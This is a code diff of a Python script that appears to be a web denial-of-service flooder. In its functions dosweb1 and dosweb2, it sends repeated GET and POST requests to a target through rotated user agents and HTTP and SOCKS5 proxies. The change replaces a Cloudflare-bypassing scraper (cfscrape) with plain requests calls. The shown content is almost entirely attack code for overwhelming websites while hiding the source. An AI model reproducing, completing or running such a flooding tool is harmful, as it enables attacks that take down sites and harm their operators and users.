@@ -2,13 +2,10 @@ import colorama
 import threading
 import random
 import requests
-import cfscrape
 import socket
 import os
 
 os.system("clear")
-
-s = cfscrape.create_scraper()
 
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
@@ -42,10 +39,10 @@ def dosweb1(target):
             'http': f'socks5://{proxyagentsocks}',
             'https': f'socks5://{proxyagentsocks}'
         }
-        s.get(target, headers=header, proxies=proxieshttp)
-        s.post(target, headers=header, proxies=proxieshttp)
-        s.get(target, headers=header2, proxies=proxiessocks)
-        s.post(target, headers=header2, proxies=proxiessocks)
+        requests.get(target, headers=header, proxies=proxieshttp)
+        requests.post(target, headers=header, proxies=proxieshttp)
+        requests.get(target, headers=header2, proxies=proxiessocks)
+        requests.post(target, headers=header2, proxies=proxiessocks)
 
 
 def dosweb2(target):
